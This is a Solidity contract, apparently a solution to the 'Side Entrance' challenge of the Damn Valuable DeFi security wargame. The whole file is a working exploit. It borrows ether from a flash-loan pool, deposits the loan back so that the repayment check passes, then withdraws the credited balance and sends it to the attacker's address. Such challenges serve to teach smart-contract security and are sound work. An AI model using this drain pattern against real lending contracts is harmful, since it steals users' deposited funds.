// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";
import "./SideEntranceLenderPool.sol";


contract SideEntranceAttack {
    using Address for address;

    SideEntranceLenderPool public immutable pool;
    address player;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
        player = msg.sender;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack(uint256 amount) public {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(player).transfer(amount);
    }

    receive() external payable {}
}
